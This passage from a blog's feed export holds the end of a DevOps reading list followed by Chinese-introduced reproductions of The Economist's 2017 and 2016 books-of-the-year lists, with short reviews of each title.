<h2 id="扩展阅读：分布式追踪系统"><a href="#扩展阅读：分布式追踪系统" class="headerlink" title="扩展阅读：分布式追踪系统"></a>扩展阅读：分布式追踪系统</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
<li><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">DevOps 漫谈：分布式追踪系统标准体系</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">DevOps 资讯 | LinkedIn 开源 Kafka Monitor</a></li>
</ul>
<h2 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h2><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><ul>
<li><a href="https://gradle.org/guides/">Gradle Tutorials and Guides</a></li>
<li><a href="https://tech.meituan.com/gradle-practice.html">灵活强大的构建系统 Gradle | 美团点评技术团队 | bob ·2014-08-18 15:41</a></li>
</ul>
<h2 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h2><ul>
<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">2018 年度 Docker 用户报告 - Sysdig Edition </a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/08/21/DevOps-Docker/">DevOps漫谈：Docker ABC</a></li>
</ul>
<h2 id="Books"><a href="#Books" class="headerlink" title="Books"></a>Books</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目|The Phoenix Project》</a></li>
<li><a href="https://book.douban.com/subject/6862062/">《持续交付：发布可靠软件的系统方法》</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">《Kanban 看板实战》</a></li>
<li><a href="https://riboseyim.github.io/2017/04/26/SRE/">《SRE：Site Reliability Engineering》</a></li>
<li><a href="https://book.douban.com/subject/26701136/">《DevOps Automation Cookbook》</a></li>
<li><a href="https://riboseyim.github.io/2017/02/09/eBook/">一些有趣的电子书</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://itrevolution.com/the-convergence-of-devops/">约翰·威利斯，“开发运维的融合”，2012年“IT变革新闻”（博客），2014年 </a></li>
<li><a href="http://velocityconf.com/velocity2009/public/schedule/detail/7641">约翰·阿尔斯帕瓦和保罗·哈蒙德，“一天超过十次部署：Flickr 公司的开发与运维协同”，O’Reilly Web 性能与运维大会网站（O’Reilly Velocity Conference website），2009年6月23日</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>The Economist 2017年度推荐书单</title>
    <url>/2018/01/30/Economist-Books-Year-2017/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/30/Economist-Books-Year-2017/" target="_blank" rel="noopener">The Economist:Books of the Year 2017</a></li>
<li><a href="https://riboseyim.github.io/2016/12/09/Economist-Books-Year-2016/" target="_blank" rel="noopener">The Economist:Books of the Year 2016</a></li>
</ul>
<a id="more"></a>
<h2 id="Books-of-the-Year-2017"><a href="#Books-of-the-Year-2017" class="headerlink" title="Books of the Year 2017"></a>Books of the Year 2017</h2><p>The best books of 2017 are about music, nicotine and the tsunami in Japan</p>
<p>Dec 9th 2017</p>
<p><strong>The Retreat of Western Liberalism.</strong> By Edward Luce. Grove Atlantic; 234 pages; $24. Little Brown; £16.99<br>Few doubt that something big has happened in Western politics over the past two years, but nobody is sure what. Turmoil in Washington and London contrasts with centrist stability in Paris and (mostly) in Berlin. In this grim diagnosis Edward Luce, a Washington-based commentator, argues that the liberal order cannot be fixed without a clear view of what has gone wrong.</p>
<p><strong>Refuge: Transforming a Broken Refugee System.</strong> By Alexander Betts and Paul Collier. Oxford University Press; 288 pages; $18.95. Allen Lane; £20<br>Lost in the row over Europe’s migration crisis in 2015 were the millions of refugees who stayed in the developing world, unwilling or unable to journey to richer countries. Growing up in a refugee camp often means little education and no work. Two experts at Oxford University present the first comprehensive attempt in years to rethink from first principles a system that has long been hidebound by hand-wringing and old ideas.</p>
<p><strong>The Road to Somewhere: The Populist Revolt and the Future of Politics.</strong> By David Goodhart. Hurst; 278 pages; $24.95 and £20<br>“Somewheres”, David Goodhart writes, are rooted, socially conservative and suspicious of the constant churn. By contrast, “Anywheres” are cosmopolitan, socially liberal, internationalist and comfortable with change. In creating a new political taxonomy, the British journalist and founder of Prospect magazine provides a useful way to think about new cleavages in Britain and elsewhere in the West. Its influence is visible everywhere.</p>
<p><strong>Ghosts of the Tsunami: Death and Life in Japan’s Disaster Zone.</strong> By Richard Lloyd Parry. Farrar, Straus and Giroux; 276 pages; $27. Jonathan Cape; £16.99<br>Of the 18,500 people who perished in the Japanese tsunami in 2011, 75 were children who died at school. But a single school accounted for 74 of those deaths. This mesmerising account of the 120-foot-high wave and its aftermath, by the Asia editor and Tokyo bureau chief of the Times, explores the uncharacteristicly fierce reaction of the dead children’s parents to official evasion. In the process it tells you more about Japan than any conventional history. The finest work of narrative non-fiction to be published this year.</p>
<h4 id="Biography-and-memoir"><a href="#Biography-and-memoir" class="headerlink" title="Biography and memoir"></a>Biography and memoir</h4><p><strong>Grant.</strong> By Ron Chernow. Penguin Press; 1,104 pages; $40. Head of Zeus; £30<br>The historian who inspired “Hamilton”, Lin-Manuel Miranda’s hit musical, argues that America’s most improbable president has been badly misunderstood. Instead of being seen as the overlord of a corrupt administration (though it never touched him personally), he should be lauded for the integration of the union after the civil war and his insistence on naming blacks, Jews and native Americans to federal positions.</p>
<p><strong>The Undoing Project: A Friendship that Changed Our Minds.</strong> By Michael Lewis. W.W. Norton; 362 pages; $28.95. Allen Lane; £25<br>A fascinating intellectual biography of the Israeli psychologists Daniel Kahneman and Amos Tversky, two very different men whose work at the intersection of psychology and economics grows more influential by the year.</p>
<p><strong>Ali: A Life.</strong> By Jonathan Eig. Houghton Mifflin Harcourt; 630 pages; $30. Simon &amp; Schuster; £25<br>Muhammad Ali often claimed to be the greatest boxer of all time, and he was right. Only a handful of athletes reach the pinnacle of their discipline; he was the only one who threw it all away to do what was unpopular but principled. A fine account of why, when Ali died, he was remembered not only as boxing’s most decorated and enthralling heavyweight, but also for his refusal to serve in the Vietnam war as a rebellion against white supremacy.</p>
<p><strong>The Dawn Watch: Joseph Conrad in a Global World.</strong> By Maya Jasanoff. Penguin Press; 400 pages; $30. William Collins; £25<br>Brought up speaking Polish and French, Jozef Teodor Konrad Korzeniowski did not learn English until he was 21. But as Joseph Conrad he became one of the finest English writers. “Heart of Darkness” is his most famous book. More important, as Maya Jasanoff shows so well, he was the first novelist of globalisation.</p>
<p><strong>Chief Engineer: Washington Roebling, the Man Who Built the Brooklyn Bridge.</strong> By Erica Wagner. Bloomsbury; 365 pages; $28 and £25<br>A biography about connections and disconnections—about the man who built what, at the time of its opening, was the longest suspension bridge in the world. Roebling also fought all his life to emerge from the shadow of a cold and domineering father. A masterful psychological study about duty and drive.</p>
<p><strong>Toscanini.</strong> By Harvey Sachs. W.W. Norton; 944 pages; $39.95 and £29.99<br>Drawing on a wide range of new evidence, including unknown letters and the archives of many of the opera houses that Arturo Toscanini worked with, including La Scala, Harvey Sachs has written a weighty and highly enjoyable account of one of the greatest conductors, a man still renowned for his pursuit of perfection.</p>
<p><strong>Anthony Powell: Dancing to the Music of Time.</strong> By Hilary Spurling. Hamish Hamilton; 528 pages; £25<br>Anthony Powell came from a brilliant generation of English writers, including George Orwell, Evelyn Waugh and Graham Greene—yet he may now be the least read of them all. Hilary Spurling’s long-awaited life of one of Britain’s most perceptive novelists of class, best known for the 12-volume “Dance to the Music of Time”, is an exemplary literary biography. On virtually every page it is colourful, funny and pointedly aphoristic.</p>
<p><strong>The Hate Race: A Memoir. By Maxine Beneba Clarke.</strong> Corsair; 261 pages; £18.99<br>The child of Jamaican/Guyanese parents who left Britain for Australia writes the book she wished she had been able to read when she was growing up in the Sydney suburbs, where “racism was as common as cornflakes”. A bestseller when it first came out in Australia, it deserves to be more widely read.</p>
<p><strong>Fall Down 7 Times Get Up 8. By Naoki Higashida.</strong> Random House; 206 pages; $27. Sceptre; £14.99<br>An unorthodox guide by a young Japanese man, who at 13 wrote a heartfelt account of how it feels like to be autistic. David Mitchell, an English novelist, and his wife, Keiko Yoshida, translated the text for their autistic son’s carers and helped get the book published in over 30 languages, making Mr Higashida probably the most widely read Japanese author after the master-novelist, Haruki Murakami.</p>
<h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><p><strong>Red Famine: Stalin’s War on Ukraine.</strong> By Anne Applebaum. Doubleday; 496 pages; $35. Allen Lane; £25<br>A meticulously researched analysis proving that the famine in Soviet Ukraine in the 1930s was part of a deliberate campaign by Josef Stalin and the Bolshevik leadership to crush Ukrainian political aspirations by starving the actual or potential nationalists into submission to the Soviet order.</p>
<p><strong>The Internationalists: How a Radical Plan to Outlaw War Remade the World.</strong> By Oona Hathaway and Scott Shapiro. Simon &amp; Schuster; 608 pages; $30. Allen Lane; £30<br>The post-war liberal order was underpinned by a movement to make the waging of aggressive war illegal. Two American academics argue that this principle is now seriously under threat.</p>
<p><strong>The Unwomanly Face of War.</strong> By Svetlana Alexievich. Random House; 384 pages; $30. Penguin Modern Classics; £12.99<br>An oral history, first published in 1985 but only now translated into English, as told by women who enlisted in the Soviet army straight from school, learning to kill and die before they learned to live or give life. By one of the most gifted writers of her generation.</p>
<p><strong>Six Minutes in May: How Churchill Unexpectedly Became Prime Minister.</strong> By Nicholas Shakespeare. Harvill Secker; 528 pages; £20<br>It is hard to imagine Britain without the jowly Winston Churchill at the helm during the second world war. Yet in May 1940 Neville Chamberlain’s government, with its majority of 213, seemed virtually unassailable. An eloquent study in how quickly the political landscape can change—and history with it.</p>
<p><strong>Enemies and Neighbours: Arabs and Jews in Palestine and Israel, 1917-2017.</strong> By Ian Black. Atlantic Monthly Press; 608 pages; $30. Allen Lane; £25<br>A well-known British journalist offers a detailed account of how the Israelis and Palestinians are still haunted by their history. The Balfour Declaration was just the start of it.</p>
<p><strong>Belonging: The Story of the Jews, 1492-1900.</strong> By Simon Schama. Ecco; 800 pages; $39.99. Bodley Head; £25<br>The story of the Jews between 1492 and 1900, told as a series of vivid biographies. In the hands of a master colourist, this is history as a portrait gallery. Roll on the final volume in the series.</p>
<p><strong>The House of Government: A Saga of the Russian Revolution.</strong> By Yuri Slezkine. Princeton University Press; 1,128 pages; $39.95 and £29.95<br>The remarkable tale of an enormous block of flats that served as home to communism’s true believers. A story that is as Russian in scope as it is symbolic of what Russia and the Russian revolution eventually became.</p>
<p><strong>Against the Grain.</strong> By James Scott. Yale University Press; 336 pages; $26 and £20<br>An interesting summation of recent research into why the first states did not develop until a long time after humans stopped being nomads and agriculture had become the norm.</p>
<h4 id="Economics-and-business"><a href="#Economics-and-business" class="headerlink" title="Economics and business"></a>Economics and business</h4><p><strong>The Great Leveller: Violence and the History of Inequality from the Stone Age to the Twenty-First Century.</strong> By Walter Scheidel. Princeton University Press; 528 pages; $35 and £27.95<br>An Austrian-born historian, now at Stanford University, argues that only catastrophic events really reduce inequality. Depressing and convincing.</p>
<p><strong>Capitalism without Capital: The Rise of the Intangible Economy.</strong> By Jonathan Haskel and Stian Westlake. Princeton University Press; 288 pages; $29.95 and £24.95<br>Businesses in rich countries are increasingly investing in “intangible” assets, including research and development, branding and public relations, and less in “tangible” ones, such as machinery. The growing importance of intangible assets plays a part in some of the big trends that are gripping rich economies, from rising income inequality to weak growth in productivity.</p>
<p><strong>Black Edge: Inside Information, Dirty Money and the Quest to Bring Down the Most Wanted Man on Wall Street.</strong> By Sheelah Kolhatkar. Random House; 344 pages; $28<br>The rise, fall and rise of Steven Cohen—a brief history of SAC Capital and how its boss inspired Bobby Axelrod of “Billions”.</p>
<p><strong>Janesville: An American Story.</strong> By Amy Goldstein. Simon &amp; Schuster; 368 pages; $27 and £18.99<br>The riveting story of what happened to a company town and the families who lived and worked there when General Motors decided to shut down its assembly plant in a city in southern Wisconsin.</p>
<p><strong>Americana: A 400-Year History of American Capitalism.</strong> By Bhu Srinivasan. Penguin Press; 576 pages; $30<br>A delightful tour through the businesses and industries that turned America into the world’s biggest economy—by a hard-working immigrant who himself became an entrepreneur. A paean to progress.</p>
<p><strong>Clashing over Commerce: A History of US Trade Policy.</strong> By Douglas Irwin. University of Chicago Press; 832 pages; $35<br>Trade-policy wonks are gluttons for punishment. In good times, their pet topic is dismissed as dull. In bad, they find trade being faulted for everything. A Dartmouth College professor sets the record straight, and in the process elegantly debunks a host of trade-policy myths.</p>
<h4 id="Culture"><a href="#Culture" class="headerlink" title="Culture"></a>Culture</h4><p><strong>The Souls of China: The Return of Religion after Mao.</strong> By Ian Johnson. Pantheon; 448 pages; $30. Allen Lane; £25<br>As ordinary people (and party leaders) are trying to workout what it means to be Chinese in the modern world, a Canadian- born academic shows how a resurgence of faith is quietly changing the country.</p>
<p><strong>Dream Hoarders: How the American Middle Class is Leaving Everyone Else in the Dust, Why That Is a Problem, and What to Do About It.</strong> By Richard Reeves. Brookings Institution Press; 196 pages; $24<br>Which of America’s social fault-lines is the most dangerous? Race? Culture? Wealth? This last offers part of an answer. Having grabbed their piece of prosperity, the upper-middle class are fighting to keep it. A British scholar, based in New York, argues in detail why it is this 10%—rather than the 1% of lore—who are the main beneficiaries (and the principal cause) of inequality in America.</p>
<p><strong>Everybody Lies: Big Data, New Data, and What the Internet Can Tell Us About Who We Really Are.</strong> By Seth Stephens-Davidowitz. Dey Street; 288 pages; $27.99. Bloomsbury; £20<br>Big data, says Seth Stephens-Davidowitz, a former data scientist for Google, provides new sources of information. It captures what people actually do or think, rather than what they choose to tell pollsters; it helps researchers home in on and compare demographic or geographical subsets; and it allows for super fast randomised controlled trials. This book argues that the web will revolutionise social science just as the microscope and telescope transformed the natural sciences.</p>
<p><strong>The Sum of Small Things: A Theory of the Aspirational Class.</strong> By Elizabeth Currid- Halkett. Princeton University Press; 254 pages; $29.95 and £24.95<br>Rather than filling their garages with flashy cars, today’s rich devote their budgets to less visible but more valuable ends: education, domestic services and cultural capital. A professor at the University of Southern California shows why it is so difficult to stop the privileged position of the elites becoming more entrenched.</p>
<p><strong>Nicotine.</strong> By Gregor Hens. Translated by Jen Calleja. Other Press; 176 pages; $16.95. Fitzcarraldo Editions; £12.99<br>Cigarettes function as punctuation for life, argues Gregor Hens, a German author and translator. They make it coherent and add drama, inserting commas, semi-colons and ellipses (and, in the end, an inarguable and often premature full stop). Smoking is bad for you, but that doesn’t mean it can’t be fun.</p>
<p><strong>The Novel of the Century: The Extraordinary Adventure of “Les Miserables”.</strong> By David Bellos. Farrah, Straus and Giroux; 336 pages; $27. Particular Books; £20<br>From the humane treatment of ex-offenders to the care of street children Victor Hugo’s epic novel, “Les Misérables”, spearheaded calls for reform and contributed to “the future improvement of society”. Few books really change the world. This one did, long before the musical broke box office records.</p>
<h4 id="Science-and-technology"><a href="#Science-and-technology" class="headerlink" title="Science and technology"></a>Science and technology</h4><p><strong>Inheritors of the Earth: How Nature is Thriving in an Age of Extinction.</strong> By Chris Thomas. PublicAffairs; 320 pages; $28. Allen Lane; £20<br>Humans have consigned species to extinction at an alarming rate. But hybridisation and speciation is happening quickly, too. An ecologist at the University of York shows how humans are bringing about a great new age of biological diversity. Extinctions ain’t what they used to be.</p>
<p><strong>Dawn of the New Everything.</strong> By Jaron Lanier. Henry Holt; 351pages; $30. Bodley Head; £20<br>An eccentric, but visionary, tech pioneer recalls a life spent in virtual reality and reflects on the growing hubris of Silicon Valley.</p>
<p><strong>Tamed: Ten Species that Changed our World.</strong> By Alice Roberts. Hutchinson; 368 pages; £20<br>For lovers of “Guns, Germs and Steel” and “Sapiens” comes a new, deceptively simple book. Alice Roberts, an anatomist and palaeopathologist, uses the story of how apples, cattle, dogs, horses and rice came to be domesticated to tell a wider story about humans’ long history.</p>
<h4 id="Fiction"><a href="#Fiction" class="headerlink" title="Fiction"></a>Fiction</h4><p><strong>Lincoln in the Bardo.</strong> By George Saunders. Random House; 368 pages; $28. Bloomsbury; £18.99<br>Abraham Lincoln’s son dies young and enters a multi-chorus Buddhistic underworld. One of the year’s most original and electrifying novels.</p>
<p><strong>White Tears.</strong> By Hari Kunzru. Knopf; 288 pages; $26.95. Hamish Hamilton; £14.99<br>A Londoner now living in New York, Hari Kunzru introduces two unforgettable characters to illustrate how black music came to be imbued with the spirit of the blues. His imagery resonates with the racial politics of modern life.</p>
<p><strong>Austral.</strong> By Paul McAuley. Gollancz; 288 pages; £14.99<br>A chase thriller set in late 21st-century Antarctica that combines elements of Jack London, J.G. Ballard and William Gibson. A significant contribution to writing about the anthropocene.</p>
<p><strong>The Seventh Function of Language.</strong> By Laurent Binet. Translated by Sam Taylor. Farrar, Straus and Giroux; 368 pages; $27. Harvill Secker; £16.99<br>A conspiracy thriller about the death of the French literary theorist, Roland Barthes, that draws on the work of Jacques Derrida and Dan Brown with tongue firmly in cheek—to hilarious effect.</p>
<p><strong>The Golden Legend.</strong> By Nadeem Aslam. Knopf; 319 pages; $27.95. Faber &amp; Faber; £16.99<br>Too much political exposition can be the death of fiction. Not so here. In his fifth novel, a British-Pakistani writer offers a richly imagined lesson in how to make great literature out of despotism.</p>
<p><strong>Stay with Me.</strong> By Ayobami Adebayo. Knopf; 272 pages; $25.95. Canongate Books; £14.99<br>A gut-wrenching tale of how wanting a child can wreck a woman, a marriage and a community. Only 29, Ayobami Adebayo is surely a writer to watch.</p>
<p><strong>Exit West.</strong> By Mohsin Hamid. Riverhead; 240 pages; $26. Hamish Hamilton; £14.99<br>A sharply pointed story about migration that came within a whisker of winning the 2017 Man Booker prize for fiction. The author of “The Reluctant Fundamentalist” has written another novel of our time.</p>
<p><strong>Fever Dream.</strong> By Samanta Schweblin. Translated by Megan McDowell. Riverhead; 192 pages; $25. OneWorld; £7.99<br>A slim novel about environmental disaster and the outer limits of love. Subtle, dreamy and indelibly creepy.</p>
<p><strong>Compass.</strong> By Mathias Enard. Translated by Charlotte Mandell. New Directions; 464 pages; $26.95. Fitzcarraldo Editions; £14.99<br>Over one night a French scholar muses on the differences between West and East. The winner of the 2015 Prix Goncourt on love, longing and otherness.</p>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title>The Economist 2016年度推荐书单</title>
    <url>/2016/12/09/Economist-Books-Year-2016/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/30/Economist-Books-Year-2017/" target="_blank" rel="noopener">The Economist:Books of the Year 2017</a></li>
<li><a href="https://riboseyim.github.io/2016/12/09/Economist-Books-Year-2016/" target="_blank" rel="noopener">The Economist:Books of the Year 2016</a></li>
</ul>
<a id="more"></a>
<h2 id="Books-of-the-Year-2016"><a href="#Books-of-the-Year-2016" class="headerlink" title="Books of the Year 2016"></a>Books of the Year 2016</h2><p>《经济学人》每年都会推出一个年度书单，包含时事政治、传记&amp;回忆录、历史、经济&amp;商业、文化&amp;社会、小说、科学&amp;技术等板块。<br>2016年度的书单里面，和中国密切相关有5本：</p>
<p><strong>The Water Kingdom: A Secret History of China</strong><br>By Philip Ball. Bodley Head; 316 pages; £25. To be published in America by University of Chicago Press in March 2017 How two great rivers—the Yellow river and the Yangzi—shaped China’s history. By a British science writer who for 20 years was an editor at Nature.</p>
<p><strong>China’s Future</strong><br>By David Shambaugh. Polity; 195 pages; $19.95 and £14.99<br>No country has modernised its economy without also becoming a democracy. A respected American political scientist asks whether China can break the mould.</p>
<p><strong>CEO, China: The Rise of Xi XXX</strong><br>By Kerry Brown. I.B. Tauris; 288 pages; $28 and £20<br>What sort of leader is Xi XXX? There are few political questions to which the answer will have greater bearing on people as this. By an expert British China-watcher.</p>
<p><strong>China’s Crony Capitalism: The Dynamics of Regime Decay</strong><br>By Minxin Pei. Harvard University Press; 365 pages; $35 and £25.95<br>How decentralising the rights of control over state property, without clarifying the rules of ownership, offered those who rule China the greatest chance in history to grow rich, by a professor of government now based in California.</p>
<p><strong>Alibaba: The House That Jack Ma Built</strong><br>By Duncan Clark. Ecco; 287 pages; $27.99 and £18.99<br>An intriguing insider’s account of how Jack Ma conquered China’s internet, by an early adviser to the company</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------------------</span><br></pre></td></tr></table></figure>
<p>The best books of 2016 are about China, language, microbes, hereditary power,<br>inequality and medieval manuscripts</p>
<p>Dec 10th 2016 Timekeeper</p>
<h4 id="Politics-and-current-affairs"><a href="#Politics-and-current-affairs" class="headerlink" title="Politics and current affairs"></a>Politics and current affairs</h4><p><strong>China’s Future</strong><br>By David Shambaugh. Polity; 195 pages; $19.95 and £14.99<br>No country has modernised its economy without also becoming a democracy. A respected American political scientist asks whether China can break the mould.</p>
<p><strong>Black Wind, White Snow: The Rise of Russia’s New Nationalism</strong><br>By Charles Clover. Yale University Press; 360 pages; $35 and £25<br>A veteran Financial Times correspondent analyses what really motivates the regime in Moscow by tracing the rise of Eurasianism: the belief (crudely put) that Russia’s national identity is determined by ethnicity, geography and destiny.</p>
<p><strong>The Euro and the Battle of Ideas</strong><br>By Markus Brunnermeier, Harold James and Jean-Pierre Landau. Princeton University Press; 440 pages; $35 and £24.95<br>Three authors focus on France and Germany to tease out the clashing economic ideas that make up the euro project. The Germans like rules and discipline, and fret about excessive debt and the moral hazard created by bail-outs. The French prefer flexibility and discretion, and worry about the lack of a mutualised debt instrument. German policymakers are often lawyers, French ones more frequently economists. Not a happy marriage.</p>
<p><strong>CEO, China: The Rise of Xi Jinping</strong><br>By Kerry Brown. I.B. Tauris; 288 pages; $28 and £20<br>What sort of leader is Xi Jinping? There are few political questions to which the answer will have greater bearing on people as this. By an expert British China-watcher.</p>
<p><strong>China’s Crony Capitalism: The Dynamics of Regime Decay</strong><br>By Minxin Pei. Harvard University Press; 365 pages; $35 and £25.95<br>How decentralising the rights of control over state property, without clarifying the rules of ownership, offered those who rule China the greatest chance in history to grow rich, by a professor of government now based in California.</p>
<p><strong>The Egyptians: A Radical Story</strong><br> By Jack Shenker. Allen Lane; 528 pages; £15.99<br>A refreshing account, by a young reporter on the Guardian, of the movement that overthrew Hosni Mubarak in 2011. What distinguishes his writing from others’ is his presence in the slums, factories and homes where Egyptians first began questioning their relations with their rulers. Mr Shenker evokes despair at the economy of this badly run country, but also surprising hope for its future, thanks to a young generation that says it is “no longer prepared to put up with the old crap”.</p>
<p><strong>Trials: On Death Row in Pakistan</strong><br>By Isabel Buchanan. Jonathan Cape; 264 pages; £16.99<br>Two young lawyers, one Pakistani and one British (the author), launch themselves into the dark world of Pakistan’s death row, where 8,000 people await execution. A remarkable first book written with verve and an eye for telling detail.</p>
<p><strong>Hillbilly Elegy: A Memoir of a Family and Culture in Crisis</strong><br>By J.D. Vance. Harper; 264 pages; $27.99. William Collins; £14.99<br>Why so many people want to believe that Donald Trump will bring back manufacturing jobs and keep immigrants out. Possibly the most important recent book about America.</p>
<p><strong>The Art of Charlie Chan Hock Chye</strong><br>By Sonny Liew. Pantheon; 320 pages; $30 and £25<br>A brilliantly inventive graphic novel, which took several years to complete, weighs up the costs and benefits of life in the small, authoritarian, model city-state that Lee Kwan Yu founded half a century ago. By a Malaysian-born comic artist and illustrator, now based in Singapore.</p>
<p><strong>The Way to the Spring: Life and Death in Palestine</strong><br>By Ben Ehrenreich. Penguin Press; 428 pages; $28. Granta; £14.99<br>An elegant and moving account of the trials of one family, a tale that is symbolic of the daily lives of many Palestinians.</p>
<h4 id="Biography-and-memoir"><a href="#Biography-and-memoir" class="headerlink" title="Biography and memoir"></a>Biography and memoir</h4><p><strong>The Return: Fathers, Sons and the Land In Between</strong><br>By Hisham Matar. Random House; 256 pages; $26. Viking; £14.99<br>A beautifully written memoir that deals with the nature of family, the emotions of exile and the ties that link the present with the past—in particular, the son with his father, Jaballa Matar, who disappeared in a notorious Libyan prison.</p>
<p><strong>Elizabeth: The Forgotten Years</strong><br>By John Guy. Viking; 490 pages; $35 and £25<br>Most historians focus on the early decades, with Elizabeth’s last years acting as a postscript to the beheading of Mary Queen of Scots and the defeat of the Spanish Armada. An Australian-born historian, now a fellow at Cambridge, argues that this period is crucial to understanding a more human side of the smart redhead.</p>
<p><strong>Half-Lion: How P.V. Narasimha Rao Transformed India</strong><br>By Vinay Sitapati. Penguin India; 391 pages; 699 rupees<br>The real father of India’s economic reforms deserves a place alongside Nehru as India’s most important prime minister. Instead he was cast into ignominy and obscurity. An important book, by a young doctoral student at Princeton, that deserves wider circulation.</p>
<p><strong>When Breath Becomes Air</strong><br> By Paul Kalanithi. Random House; 238 pages; $25. Bodley Head; £12.99<br>A young neurosurgeon, dying of cancer, examines his life, especially the gift of language, the parts of the brain that control it and its centrality to what makes us human. A powerful and compelling read.</p>
<p><strong>Karl Marx: Greatness and Illusion</strong><br> By Gareth Stedman Jones. Belknap; 768 pages; $35. Allen Lane; £35<br>A British historian re-evaluates Marx in the 21st century. There is no better guide than this professor of the history of ideas at the University of London.</p>
<p><strong>Negroland: A Memoir</strong><br> By Margo Jefferson. Vintage; 248 pages; $16. Granta; £12.99<br>Growing up an African-American of privilege and wealth might seem cushy. But this penetrating memoir shows how those who were spared the brutality of southern segregation nevertheless had to learn to navigate a much subtler set of tacit rules and assumptions: excel, but don’t show off; be comfortable anywhere, but be aware that prejudice can rear its ugly head at any moment.</p>
<p><strong>Kenneth Clark: Life, Art and “Civilisation”</strong><br>By James Stourton. Knopf; 478 pages; $35. William Collins; £30<br>At once cold and grand, Kenneth Clark would be easy to mock. A carefully researched and thoughtful biography of a conflicted and curiously unknowable man who became the most brilliant cultural populist of the 20th century, by a former chairman of Sotheby’s.</p>
<p><strong>Born to Run</strong><br> By Bruce Springsteen. Simon &amp; Schuster; 528 pages; $32.50 and £20<br>The timely autobiography of the bard of American deindustrialisation, whose songs recognise and honour blue-collar woes. His stories have never aged; years after they were written they remain a lesson in empathy for the white-collar fans he has always attracted.</p>
<p><strong>But You Did Not Come Back</strong><br>By Marceline Loridan-Ivens. Translated by Sandra Smith. Atlantic Monthly Press; 112 pages; $22. Faber; £12.99<br>In 1944, when she was 15, the author and her father were captured and deported; he to Auschwitz, she to Birkenau. She returned; he never did. It took her 70 years to write her story. In tight, unsparing prose, she confronts the delusions her father held, and the lies she told herself. A small book with a big voice.</p>
<p><strong>The Civil Wars of Julia Ward Howe A Biography</strong><br>By Elaine Showalter. Simon &amp; Schuster; 243 pages; $28<br>A delightful life, by a spirited academic, of a 19th-century American woman who wrote poetry, plays and books, became a tireless speaker for feminist causes, notably women’s right to vote. Her life intersected with Longfellow, the Brownings, Louisa May Alcott and Henry James. But she is best known for writing the words to “The Battle Hymn of the Republic”.</p>
<p><strong>Outlandish Knight: The Byzantine Life of Steven Runciman</strong><br>By Minoo Dinshaw. Allen Lane; 767 pages; £30<br>By the time he died, in 2000 at the age of 97, Sir Steven Runciman had become convinced that he was a relic of a past age and the embodiment of a nearly mythical era. A lively life of a colourful British historian who was best known for his work on the Crusades, by a promising young author. A debut to be proud of.</p>
<h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><p><strong>The Water Kingdom: A Secret History of China</strong><br>By Philip Ball. Bodley Head; 316 pages; £25. To be published in America by University of Chicago Press in March 2017 How two great rivers—the Yellow river and the Yangzi—shaped China’s history. By a British science writer who for 20 years was an editor at Nature.</p>
<p><strong>The Romanovs: 1613-1918</strong><br>By Simon Sebag Montefiore. Knopf; 784 pages; $35. Weidenfeld &amp; Nicolson; £25<br>A cruel history of hereditary power, by a master storyteller who lifts this unfamiliar narrative with vivid, amusing and surprising details.</p>
<p><strong>The Pursuit of Power: Europe 1815-1914</strong><br>By Richard Evans. Viking; 928 pages; $40. Allen Lane; £35<br>A distinguished scholar of Germany tots up the winners and losers in the century after the Battle of Waterloo, which could rightly be described as the first age of globalisation.</p>
